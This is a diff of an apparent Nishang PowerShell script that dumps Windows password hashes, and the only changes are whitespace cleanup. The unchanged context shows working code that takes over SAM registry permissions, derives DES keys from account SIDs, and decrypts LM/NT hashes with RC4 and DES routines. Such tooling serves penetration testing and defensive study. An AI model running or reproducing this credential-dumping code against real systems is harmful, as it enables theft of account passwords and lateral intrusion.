@@ -23,7 +23,7 @@ https://github.com/samratashok/nishang
 .Notes
 Reflection added by https://github.com/Zer1t0
 
-#> 
+#>
 [CmdletBinding()]
 Param (
     [Switch]$PSObjectFormat
@@ -125,7 +125,7 @@ function LoadApi
     )
     $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
     ################################################################################
-    
+
     $script:PowerDump = $TypeBuilder.CreateType()
 }
 
@@ -153,7 +153,6 @@ $odd_parity = @(
   224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
   241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
 );
-
 function sid_to_key($sid)
 {
     $c0 = $sid -band 255
@@ -166,7 +165,6 @@ function sid_to_key($sid)
 
     return ,((str_to_key $s1),(str_to_key $s2))
 }
-
 function str_to_key($s)
 {
     $k0 = [int][math]::Floor($s[0] * 0.5)
@@ -186,7 +184,6 @@ function str_to_key($s)
 
     return ,$key
 }
-
 function NewRC4([byte[]]$key)
 {
     return new-object Object |
@@ -218,17 +215,14 @@ function NewRC4([byte[]]$key)
         return ,$outbuf;
     } -PassThru
 }
-
 function des_encrypt([byte[]]$data, [byte[]]$key)
 {
     return ,(des_transform $data $key $true)
 }
-
 function des_decrypt([byte[]]$data, [byte[]]$key)
 {
     return ,(des_transform $data $key $false)
 }
-
 function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
 {
     $des = new-object Security.Cryptography.DESCryptoServiceProvider;
@@ -317,7 +311,7 @@ function Get-UserName([byte[]]$V)
 function Get-UserHashes($u, [byte[]]$hbootkey)
 {
     [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
-    
+
     # check if hashes exist (if byte memory equals to 20, then we've got a hash)
     $LM_exists = $false;
     $NT_exists = $false;
@@ -339,7 +333,7 @@ function Get-UserHashes($u, [byte[]]$hbootkey)
         $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
         $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
     }
-	
+
     elseif ($NT_exists -eq $true)
     {
         $nt_hash_offset = $u.HashOffset + 8;
@@ -443,8 +437,5 @@ function DumpHashes
         $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
         $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
         Set-Acl HKLM:\SAM\SAM\Domains $acl
-
     }
 }
-
-
